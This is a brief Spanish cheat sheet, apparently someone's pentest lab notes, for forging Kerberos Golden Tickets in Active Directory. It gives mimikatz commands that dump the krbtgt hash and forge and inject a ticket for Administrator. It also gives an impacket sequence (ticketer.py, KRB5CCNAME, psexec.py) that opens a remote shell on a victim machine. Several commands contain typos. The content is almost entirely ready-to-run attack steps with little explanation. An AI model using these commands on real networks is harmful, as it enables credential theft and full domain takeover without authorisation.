
# GOLDEN TICKET ATACK DESDE DENTRO
```shell
#SUBIR EL MIMIKATZ (CON URL CACHE)
...

#ENUMERAR INFORMACIÓN DE KRBTGT
mimikatz.exe
lsadump::lsa /inject /name:krbtgt #COPIAMOS TODA LA INFORMACIÓN QUE NOS DEVUELVA
kerberos::golden /domain:s4vicorp.local /sid:(lo cogemos del anterior comando) /rc4:(LO COGEMOS DEL ANTERIOR COMANDO EN EL PARAMETRO DEL HASH NTLM) /user:Administrator /ticket:goolden.kirbi

#NOS HA TENIDOO QUE DEVOLVER UN golden.kirbi, ESTE LO IMPORTAMOS EN NUESTRA MÁQUINA.
kerberos::ptt golden.kirbi
```


# GOLDEN TICKET TICKETER.py
```shell
#SUBIR EL MIMIKATZ (CON URL CACHE)
...

#ENUMERAR INFORMACIÓN DE KRBTGT
mimikatz.exe
lsadump::lsa /inject /name:krbtgt #COPIAMOS TODA LA INFORMACIÓN QUE NOS DEVUELVA

#EN NUESTRA MÁQUINA -- GENERAR EL GOLDEN TICKET.
ticketer.py -nthash (HASH NTML) -domain-sid (PONEMOS EL DOMAIN SID) -domain s4vicorp.local Administrator
expoort KRB5CCNAME="administrator.ccache"

#CONECTARNOS A LA MÁQUINA VICTIMA
psexec.py -n -k s4vicorb.local/Administrator@IP cmd.exe #NOS DEBERIA DE CONECTAR AUTOMÁTICAMENTE YA QUE NOS TIRA DE LA VARIABLE QUE HEMOS GUARDADO ANTERIORMENTE.
```